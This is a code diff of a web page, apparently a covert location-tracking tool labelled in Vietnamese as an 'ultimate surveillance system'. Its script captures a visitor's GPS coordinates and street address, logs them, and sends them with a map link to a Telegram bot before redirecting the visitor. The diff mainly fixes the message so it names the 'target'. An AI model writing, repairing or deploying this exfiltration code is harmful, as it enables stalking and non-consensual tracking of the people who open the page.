@@ -41,8 +41,7 @@
         <div class="max-w-7xl mx-auto space-y-6">
             <header class="flex justify-between items-center border-b border-gray-800 pb-6">
                 <div>
-                    <h1 class="text-2xl font-black text-white italic uppercase tracking-tighter uppercase">BCA 
-                        </h1>
+                    <h1 class="text-2xl font-black text-white italic uppercase tracking-tighter uppercase">BCA</h1>
                     <p class="text-[9px] text-gray-500 uppercase tracking-widest"><span class="live-dot"></span>Hệ thống giám sát tối thượng</p>
                 </div>
                 <button onclick="logout()" class="text-[10px] bg-red-950/20 text-red-500 border border-red-900/50 px-4 py-2 rounded-xl font-bold uppercase">Logout</button>
@@ -177,7 +176,7 @@
                     
                     logData.lat = lat; logData.lon = lon; logData.address = fullAddr; logData.st = 'GPS';
                     saveLog(logData);
-                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + VỊ TRÍ + "</b> OK\n📍 " + fullAddr + "\n🗺️ Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
+                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + target + "</b> GPS OK\n📍 " + fullAddr + "\n🗺️ Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
                     jump();
                 }, jump, { timeout: 6000 });
             } else { jump(); }
